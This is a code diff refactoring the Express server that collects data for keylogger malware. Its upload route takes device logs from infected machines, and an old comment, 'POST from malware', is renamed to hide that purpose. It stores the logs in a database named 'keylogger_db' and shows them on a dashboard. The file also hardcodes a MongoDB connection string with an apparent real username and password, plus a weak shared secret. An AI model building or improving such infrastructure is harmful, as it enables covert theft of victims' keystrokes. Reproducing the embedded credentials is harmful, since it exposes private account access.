@@ -5,23 +5,36 @@ const path = require('path');
 
 const app = express();
 
-// === Change this when testing done ===
-const SECRET_KEY = 'test123abc';  // ← simple for now; change to strong one later
+const SECRET_KEY = 'test123abc';  // keep simple for now
 
 const mongoUri = 'mongodb+srv://rxmha2:mimimithila125@cluster0.c0qkq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
-const client = new MongoClient(mongoUri);
-let db;
 
-async function connectDb() {
+let cachedDb = null;
+let cachedClient = null;
+
+async function connectToDatabase() {
+  if (cachedDb) return cachedDb;
+
   try {
+    const client = new MongoClient(mongoUri, {
+      connectTimeoutMS: 30000,
+      serverSelectionTimeoutMS: 30000,
+      maxPoolSize: 10,
+      retryWrites: true,
+    });
+
     await client.connect();
-    db = client.db('keylogger_db');  // create/use this DB name
-    console.log('Connected to MongoDB Atlas');
+    const db = client.db('keylogger_db');
+
+    cachedClient = client;
+    cachedDb = db;
+    console.log('MongoDB connected successfully');
+    return db;
   } catch (err) {
-    console.error('MongoDB connection error:', err);
+    console.error('MongoDB connection failed:', err);
+    throw err;  // let route handle it
   }
 }
-connectDb();  // run on startup
 
 // Middleware
 app.use(bodyParser.json({ limit: '10mb' }));
@@ -29,15 +42,21 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, '../views'));
 
-// POST from malware
+// POST /upload
 app.post('/upload', async (req, res) => {
+  let db;
+  try {
+    db = await connectToDatabase();
+  } catch (err) {
+    return res.status(500).json({ error: 'Database connection failed' });
+  }
+
   const authHeader = req.headers['authorization'];
   if (!authHeader || authHeader !== `Bearer ${SECRET_KEY}`) {
     return res.status(401).json({ error: 'Unauthorized' });
   }
 
   const { device, logs, timestamp } = req.body;
-
   if (!device || !logs || !timestamp) {
     return res.status(400).json({ error: 'Missing required fields' });
   }
@@ -52,16 +71,20 @@ app.post('/upload', async (req, res) => {
     res.status(200).json({ success: true, id: result.insertedId });
   } catch (err) {
     console.error('Insert error:', err);
-    res.status(500).json({ error: 'Database error' });
+    res.status(500).json({ error: 'Database insert failed' });
   }
 });
 
-// Dashboard
+// GET /dashboard
 app.get('/dashboard', async (req, res) => {
-  const auth = req.query.auth;
-  console.log('Received auth:', auth);  // debug
-  console.log('Expected key:', SECRET_KEY);  // debug
+  let db;
+  try {
+    db = await connectToDatabase();
+  } catch (err) {
+    return res.status(500).send('Database connection failed - check logs');
+  }
 
+  const auth = req.query.auth;
   if (auth !== SECRET_KEY) {
     return res.status(401).send('Access denied. Invalid auth key.');
   }
@@ -75,7 +98,7 @@ app.get('/dashboard', async (req, res) => {
     res.render('dashboard', { logs });
   } catch (err) {
     console.error('Query error:', err);
-    res.status(500).send('Database error');
+    res.status(500).send('Database query failed');
   }
 });
 
